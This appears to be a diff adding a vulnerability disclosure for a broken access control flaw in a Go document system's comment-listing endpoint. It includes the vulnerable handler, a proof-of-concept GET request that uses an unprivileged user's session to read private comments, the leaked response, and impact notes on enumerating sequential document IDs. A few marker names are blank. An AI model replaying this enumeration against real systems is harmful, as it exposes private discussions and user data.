@@ -1,0 +1,51 @@
+### 1. Vulnerable code location
+`CommentController.Lists()` skips all permission checks and queries comments purely by `docid`:
+
+```go
+func (c *CommentController) Lists() {
+    docid, _ := c.GetInt("docid", 0)
+    pageIndex, _ := c.GetInt("page", 1)
+
+    // No permission check at all — queries comments by docid directly
+    comments, count, pageIndex := models.NewComment().QueryCommentByDocumentId(
+        docid, pageIndex, conf.PageSize, c.Member)
+    page := pagination.PageUtil(int(count), pageIndex, conf.PageSize, comments)
+
+    var data struct {
+        DocId int             `json:"doc_id"`
+        Page  pagination.Page `json:"page"`
+    }
+    data.DocId = docid
+    data.Page = page
+
+    c.JsonResult(0, "ok", data)
+    return
+}
+```
+
+`CommentModel.QueryCommentByDocumentId` only validates that the document exists; it does not validate the document's visibility (public/private) or the requester's ownership/membership.
+
+### 2. PoC
+
+Detection procedure: the administrator account posted a comment containing the canary marker  on a document  inside a **private project**. The attacker account (attacker, a regular user with no membership in that project) then requested the comment list using **its own session cookie**:
+
+```http
+GET /comment/lists?docid=3 HTTP/1.1
+Host: 192.168.233.134:9011
+X-Requested-With: XMLHttpRequest
+Cookie: csrftoken=<attacker-csrftoken>; sessionid=<attacker-sessionid>
+```
+
+Response (HTTP 200) contains the comment of the private document that the attacker has no permission to access:
+
+```json
+{"data":{"doc_id":3,"page":{"TotalCount":1,"List":[{"comment_id":1,
+  "content":"private_information","author":"highvictim", ...}]},"errcode":0}
+```
+
+injected solely into the comment body of the private document is present in the attacker's response, proving full disclosure of the private document's comment content.
+
+### 3. Impact
+
+- Any authenticated user can enumerate `docid` (sequential ID) to bulk-harvest comments of every document in the system, including those of administrators' private documents;
+- Leaked fields include the comment body (potentially internal discussions), commenter username, IP address, and timestamps;
